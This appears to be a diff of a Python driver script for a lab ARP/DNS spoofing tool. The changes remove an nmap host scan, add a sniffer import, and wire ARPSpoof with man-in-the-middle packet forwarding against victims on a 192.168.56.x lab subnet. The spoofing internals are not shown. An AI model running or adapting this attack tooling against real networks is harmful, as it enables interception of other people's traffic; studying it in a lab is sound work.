@@ -15,6 +15,7 @@ import dns_spoofing
 from arp_spoofing import ARPSpoof
 import arp_spoofing
 from utils.interface import InterfaceConfig
+from utils.sniff import PacketSniff
 
 			
 def begin():
@@ -28,26 +29,8 @@ def begin():
 	attack_to_perform = input()
 	if attack_to_perform == "1":
 	
-	#search for available hosts
-		hosts=[]
-		target = '192.168.56.0/24'
- 
-		scanner = nmap.PortScanner()
-		scanner.scan(target, arguments='-sn', sudo=True)
- 
-		hosts = []
- 
-		for host in scanner.all_hosts():
-			addresses = scanner[host]['addresses']
- 
-			hosts.append(addresses)
-		print('\n*** Hosts available to attack ***\n') 
-		print(hosts)
-	
 		print("\n \nSet your Victim's IP Address")
 		Victim1_ip= input()
-		
-		print("\n \nVictim selected with MAC Address: " + getmacbyip(Victim1_ip))
 	
 		print("\n \nWould you like to become Man-In-The_Middle?")
 		choice=input()
@@ -68,11 +51,14 @@ def begin():
 			DuckForce = True
 		else: DuckForce = False
 		
-		arp_attack = ARPSpoof(victim1_ip = Victim1_ip, victim2_ip ="192.168.56.102", mitm =MitM,restore= Restore_Cache,duckforce= DuckForce)
-		
+		arp_attack = ARPSpoof(interface_config = 'eth0', victim1_ip = Victim1_ip, victim2_ip ="192.168.56.103", mitm =MitM,restore= Restore_Cache,duckforce= DuckForce)
 		try: 
 			while True:
 				arp_attack.start_attack()
+
+				print("started")
+				arp_attack.packet_forwarding()
+				print("forwarding ended")
 				if arp_attack.duckforce == False:
 					break
 		except KeyboardInterrupt:
@@ -93,7 +79,7 @@ def begin():
 		#except KeyboardInterrupt:
 		#		pass
 		#print("Restoring ARP Cache...")
-		#arp_attack_4dns.restore_arp()
+		#arp_attack.restore_arp()
 		print("dns")
 		
 	return 
